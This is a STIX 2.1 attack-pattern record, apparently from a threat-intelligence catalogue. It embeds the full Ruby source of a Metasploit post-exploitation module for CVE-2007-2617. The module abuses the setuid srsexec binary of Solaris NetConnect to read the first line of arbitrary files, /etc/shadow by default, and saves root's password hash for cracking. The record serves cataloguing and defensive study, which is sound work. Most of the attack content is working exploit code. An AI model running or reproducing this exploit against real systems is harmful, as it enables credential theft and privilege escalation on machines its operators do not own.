{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d6d4b213-7d61-4316-9536-0501169210a1",
    "created": "2024-08-14T16:32:57.991815Z",
    "modified": "2024-08-14T16:32:57.991819Z",
    "name": "Solaris srsexec Arbitrary File Reader",
    "description": " This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5. When srsexec is executed in debug (-d) verbose (-v) mode the first line of an arbitrary file can be read due to the suid bit set. The most widely accepted exploitation vector is reading /etc/shadow which will reveal root's hash for cracking.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/solaris/escalate/srsexec_readline.rb",
            "external_id": "srsexec_readline.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-2617"
        },
        {
            "source_name": "reference",
            "url": "https://download.oracle.com/sunalerts/1000443.1.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.securityfocus.com/archive/1/468235"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Solaris srsexec Arbitrary File Reader',\n        'Description' => %q{\n          This module exploits a vulnerability in NetCommander 3.2.3 and 3.2.5.\n          When srsexec is executed in debug (-d) verbose (-v) mode,\n          the first line of an arbitrary file can be read due to the suid bit set.\n          The most widely accepted exploitation vector is reading /etc/shadow,\n          which will reveal root's hash for cracking.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # metasploit module\n          'iDefense' # discovery reported anonymously to https://labs.idefense.com\n        ],\n        'Platform' => [ 'solaris' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'References' => [\n          ['CVE', '2007-2617'],\n          ['URL', 'https://download.oracle.com/sunalerts/1000443.1.html'],\n          ['URL', 'https://www.securityfocus.com/archive/1/468235'],\n          ['EDB', '30021'],\n          ['BID', '23915']\n        ],\n        'DisclosureDate' => '2007-05-07'\n      )\n    )\n    register_options([\n      OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow'])\n    ])\n  end\n\n  def suid_bin_path\n    '/opt/SUNWsrspx/bin/srsexec'\n  end\n\n  def check\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    # This ls is based on the guidance in the sun alerts article\n    unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'\n    unin =~ /UninstallNetConnect\\.([\\d.]{11})\\.sh/\n    unless ::Regexp.last_match(1)\n      print_error 'NetConnect uninstall not found, either not installed or too new'\n      return false\n    end\n\n    version = Rex::Version.new(::Regexp.last_match(1).split('.').map(&:to_i).join('.'))\n    unless version.between?(Rex::Version.new('3.2.3'), Rex::Version.new('3.2.4'))\n      print_error \"#{version} is not vulnerable\"\n      return false\n    end\n    print_good \"#{version} is vulnerable\"\n\n    unless setuid? suid_bin_path\n      vprint_error \"#{suid_bin_path} is not setuid, it must have been manually patched\"\n      return false\n    end\n\n    true\n  end\n\n  def run\n    unless check\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    flag = Rex::Text.rand_text_alpha 5\n    output = cmd_exec(\"#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}\")\n    vprint_good(\"Raw Command Output: #{output}\")\n\n    # The first line of the file is cut at 20 characters.\n    # If the output is longer than 20 characters, then\n    # the next line will start with the last 2 characters from the previous line,\n    # followed by the next 18 characters.\n\n    formatted_output = output.scan(/binaries file line: (.+)$/).flatten.map do |line|\n      (line.length == 20) ? line[0..17] : line\n    end.join\n\n    return if formatted_output.empty?\n\n    print_good(\"First line of #{datastore['FILE']}: #{formatted_output}\")\n\n    return unless datastore['FILE'] == '/etc/shadow'\n\n    print_good(\"Adding root's hash to the credential database.\")\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      workspace_id: myworkspace_id,\n      post_reference_name: fullname,\n      username: formatted_output.split(':')[0],\n      private_data: formatted_output.split(':')[1],\n      private_type: :nonreplayable_hash\n    }\n    create_credential(credential_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-07",
    "x_mitre_platforms": [
        "[ 'solaris' ]"
    ]
}